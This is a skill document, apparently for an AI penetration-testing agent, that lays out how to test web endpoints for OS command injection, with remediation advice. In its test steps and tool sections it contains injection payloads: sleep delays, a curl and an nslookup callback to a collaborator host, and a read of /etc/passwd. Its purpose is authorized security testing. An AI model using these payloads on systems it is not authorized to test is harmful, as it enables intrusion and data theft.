---
name: testing-command-injection
description: Test for OWASP A03 OS Command Injection in user-controlled inputs flowing to shell execution — including blind via time delay.
---

# Testing for OS Command Injection

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-api-enum`, `recon-content-discovery`, `mcp-burp`.

Use this skill when the target application invokes a shell or external process
with user-supplied input. Common scenarios include network diagnostic tools
(ping, traceroute, nslookup exposed as web features), file-conversion services,
image manipulation endpoints (resize, thumbnail generation), and any feature
that shells out to a system binary to fulfill a request.

## Signal to look for

- Endpoints named or containing "run", "execute", "convert", "ping", "scan",
  "lookup", or "process".
- Error messages that expose shell internals: `/bin/sh`, `sh:`, `error:`,
  `command not found`, `No such file or directory`.
- Unexpected command-line-like output fragments in the response body or logs
  (e.g., path strings, process IDs, permission-denied messages).
- Parameters whose value is clearly passed verbatim to a system utility (e.g.,
  `host=`, `target=`, `filename=`, `format=`).

## Test steps

1. Probe with shell metacharacters appended to a known-valid parameter value:
   `;`, `|`, `` ` ``, `$()`, `&&`. Send one variant at a time and compare
   responses for anomalous content or errors.
2. Time-based blind confirmation: append `; sleep 10 #` to the parameter value
   and measure end-to-end response time. Repeat five times; if the median
   response time increases by approximately 10 seconds versus the baseline,
   injection is confirmed.
3. Out-of-band (OOB) confirmation via interactsh or Burp Collaborator (Pro)
   when the application returns no output — inject
   `; curl http://<collaborator-host>/ #` or
   `; nslookup <collaborator-host> #` and observe the callback.
4. Extract data to confirm impact via `; cat /etc/passwd #`. Only proceed
   with data extraction after confirming the action is within written
   authorization — see `methodology-rules-of-engagement`.
5. Capture all evidence per `methodology-evidence-capture`: raw request with
   payload, full response (or timing proof), and reproduction steps.

## Tool commands

### Shell

```bash
# Automated injection detection with commix (level 2 = extended heuristics)
commix --url="https://target.example.com/api/ping" --data="host=x" --level=2
# Success: commix reports injection technique and OS

# Manual time-delay probe — baseline first, then payload
curl -s -o /dev/null -w "%{time_total}\n" \
  "https://target.example.com/api/ping" \
  --data "host=127.0.0.1"

curl -s -o /dev/null -w "%{time_total}\n" \
  "https://target.example.com/api/ping" \
  --data "host=127.0.0.1%3B+sleep+10+%23"
# Compare time_total values; ~10 s delta confirms blind injection
```

### MCP

Base64-encode the raw request containing the sleep payload, then send via
Burp Repeater to capture a timestamped evidence tab:

```
burp_repeater_send(
  raw_base64=<b64 of POST /api/ping HTTP/1.1 request with body host=127.0.0.1; sleep 10 #>,
  host="target.example.com",
  port=443,
  secure=true,
  tab_name="cmdi-probe"
)
# Success: {"ok": true, "data": {"tab_id": "..."}}
# The tab records send time and elapsed time — screenshot for evidence.
```

Retrieve the original request from history to build the base64 input:

```
burp_proxy_history(host="target.example.com", method="POST", limit=20)
burp_proxy_request(id=<N>)
```

## Interpret results

**Non-blind injection:** Command output (e.g., `root:x:0:0:root:/root:/bin/bash`)
appears directly in the response body. This is unambiguous.

**Blind time-based injection:** A reliable time delay that correlates with the
sleep duration confirms injection. Take the median of five trials to rule out
accidental delays. The response time should increase by approximately the sleep
value (10 s) while all other response characteristics remain identical.

**False positives to exclude:**

- Application-level processing (video encode, image conversion) that naturally
  takes several seconds — establish a baseline with a benign payload of the
  same type and size.
- Network latency spikes — compare against multiple baseline measurements;
  true injection produces consistent, reproducible delay rather than
  intermittent delay.
- Server-side rate limiting or queuing that serializes requests — test from
  a clean session with no concurrent requests.

## Finding writeup

- **Title:** `OS Command Injection in <endpoint>` (e.g.,
  "OS Command Injection in `/api/ping` via `host` parameter").
- **Severity:**
  - Remote code execution with confirmed output: **Critical**.
  - Blind injection without extracted data (OOB callback or time delay only):
    **High**.
- **Evidence** (per `methodology-evidence-capture`):
  - Raw HTTP request containing the injection payload.
  - Response showing command output, or timing proof (baseline vs. payload
    response times from five trials).
  - `burp_repeater_send` reproduction call with the exact `raw_base64` value
    so a reviewer can replay in one step.
- **Suggested fix:**
  - Avoid shell invocation entirely; use language-native libraries for the
    underlying operation (e.g., Python `socket` instead of shelling out to
    `ping`, Pillow instead of ImageMagick via shell).
  - If invoking an external process is unavoidable, pass arguments as a list
    (e.g., Python `subprocess.run(["ping", "-c", "1", host], ...)`) rather
    than as a concatenated string, and never pass user input to a shell
    interpreter directly.
  - Apply an allowlist to restrict the parameter to expected characters
    (e.g., IP address or hostname pattern) as a defense-in-depth measure.

## References

- OWASP WSTG INPV-12 — Testing for Command Injection:
  `https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection`
- PortSwigger OS command injection:
  `https://portswigger.net/web-security/os-command-injection`
- CWE-78 — Improper Neutralization of Special Elements used in an OS Command:
  `https://cwe.mitre.org/data/definitions/78.html`

## Authorization note

Only use against systems you are authorized to test. This skill assumes the user has obtained written authorization. If authorization is uncertain, stop and confirm scope before proceeding.
